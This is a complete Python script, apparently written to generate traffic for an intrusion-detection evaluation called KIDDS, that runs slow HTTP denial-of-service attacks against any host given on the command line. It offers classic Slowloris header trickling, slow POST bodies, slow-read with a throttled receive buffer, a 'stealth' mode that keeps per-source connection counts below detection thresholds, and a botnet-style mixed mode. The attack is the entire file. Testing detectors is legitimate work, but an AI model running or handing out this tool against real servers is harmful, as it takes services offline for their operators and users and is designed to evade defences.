#!/usr/bin/env python3
"""
Advanced Slowloris & Slow HTTP Attack Suite for KIDDS Evaluation

Supported Attack Vectors:
  1. 'headers' (Classic Slowloris):
     Sends incomplete HTTP request headers (GET /?rand HTTP/1.1), followed by
     trickle headers ('X-a: rand\\r\\n') every T seconds. Never sends the closing '\\r\\n\\r\\n'.

  2. 'body' / 'rudy' (R-U-Dead-Yet / Slow POST):
     Sends complete headers with a huge Content-Length (e.g. 1,000,000 bytes) and
     POST method, then trickles the body data 1 byte every T seconds.

  3. 'read' (Slow Read Attack):
     Requests large static files (e.g. /large.bin) with minimal TCP window size or
     throttled receive buffer, reading only a few bytes at long intervals.

  4. 'stealth' (Distributed Sub-Threshold Slowloris):
     Distributes slow connections with intentional inter-arrival jitter, keeping
     concurrency per worker/source IP below typical thresholds (e.g., <= 15 conns).

  5. 'mixed':
     Simulates a polymorphic botnet combining slow headers, slow body, and slow read.

Usage:
  python3 slowloris_suite.py <target_host> --port 80 --mode [headers|body|read|stealth|mixed] --sockets 300 --duration 30
"""

import argparse
import logging
import random
import socket
import ssl
import sys
import threading
import time

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0"
]


class SlowAttackWorker:
    def __init__(self, host, port, mode, interval, use_ssl=False):
        self.host = host
        self.port = port
        self.mode = mode
        self.interval = interval
        self.use_ssl = use_ssl
        self.sock = None
        self.running = True

    def create_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)

        if self.mode == "read":
            # Set tiny TCP receive buffer to throttle server-side TCP window
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1024)
            except Exception:
                pass

        if self.use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=self.host)

        s.connect((self.host, self.port))
        ua = random.choice(USER_AGENTS)

        if self.mode in ("headers", "stealth"):
            # Incomplete GET headers
            req = (
                f"GET /?{random.randint(1000, 999999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
            )
            s.sendall(req.encode("utf-8"))

        elif self.mode == "body":
            # Slow POST with large declared body
            content_len = random.randint(100000, 2000000)
            req = (
                f"POST /?{random.randint(1000, 999999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {content_len}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.sendall(req.encode("utf-8"))

        elif self.mode == "read":
            # Slow read of server content
            req = (
                f"GET /large.bin?{random.randint(1000, 999999)} HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.sendall(req.encode("utf-8"))

        return s

    def run(self):
        while self.running:
            try:
                if not self.sock:
                    self.sock = self.create_socket()

                # Trickle keep-alive payload depending on mode
                if self.mode in ("headers", "stealth"):
                    hdr = f"X-a: {random.randint(1, 99999)}\r\n"
                    self.sock.sendall(hdr.encode("utf-8"))

                elif self.mode == "body":
                    # Send tiny chunk of POST body
                    chunk = f"a={random.randint(0, 9)}&"
                    self.sock.sendall(chunk.encode("utf-8"))

                elif self.mode == "read":
                    # Slowly drain small amount of bytes from server
                    try:
                        self.sock.settimeout(2)
                        data = self.sock.recv(64)
                        if not data:
                            self.sock.close()
                            self.sock = None
                    except socket.timeout:
                        pass

                # Sleep interval with slight jitter
                jitter = random.uniform(-0.5, 0.5)
                sleep_t = max(self.interval + jitter, 1.0)
                time.sleep(sleep_t)

            except Exception:
                if self.sock:
                    try:
                        self.sock.close()
                    except Exception:
                        pass
                    self.sock = None
                time.sleep(1)

    def stop(self):
        self.running = False
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass


def main():
    parser = argparse.ArgumentParser(description="KIDDS Advanced Slowloris & Slow HTTP Attack Suite")
    parser.add_argument("host", help="Target server IP or hostname")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target port (default 80)")
    parser.add_argument("-m", "--mode", choices=["headers", "body", "read", "stealth", "mixed"],
                        default="headers", help="Attack vector variant")
    parser.add_argument("-s", "--sockets", type=int, default=150, help="Total active attack sockets")
    parser.add_argument("-i", "--interval", type=float, default=5.0, help="Keep-alive trickle interval in seconds")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Attack duration in seconds (0 = infinite)")
    parser.add_argument("--ssl", action="store_true", help="Enable HTTPS/TLS")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(message)s")
    logging.info(f"Starting Slow HTTP Attack against {args.host}:{args.port}")
    logging.info(f"Mode: {args.mode.upper()} | Target Sockets: {args.sockets} | Interval: {args.interval}s")

    workers = []
    modes_pool = ["headers", "body", "read"] if args.mode == "mixed" else [args.mode]

    for i in range(args.sockets):
        chosen_mode = random.choice(modes_pool)
        w = SlowAttackWorker(args.host, args.port, chosen_mode, args.interval, args.ssl)
        workers.append(w)
        t = threading.Thread(target=w.run, daemon=True)
        t.start()
        # Stagger connection ramp-up to avoid immediate SYN drop
        if i % 25 == 0:
            time.sleep(0.1)

    logging.info(f"All {args.sockets} attack threads initialized and active.")

    try:
        t_start = time.time()
        while True:
            time.sleep(1)
            elapsed = time.time() - t_start
            active = sum(1 for w in workers if w.sock is not None)
            if int(elapsed) % 5 == 0:
                logging.info(f"[{elapsed:.0f}s] Active Slow Sockets: {active}/{args.sockets}")
            if args.duration > 0 and elapsed >= args.duration:
                break
    except KeyboardInterrupt:
        logging.info("Attack interrupted by user.")
    finally:
        logging.info("Stopping attack workers...")
        for w in workers:
            w.stop()
        logging.info("Attack stopped successfully.")


if __name__ == "__main__":
    main()
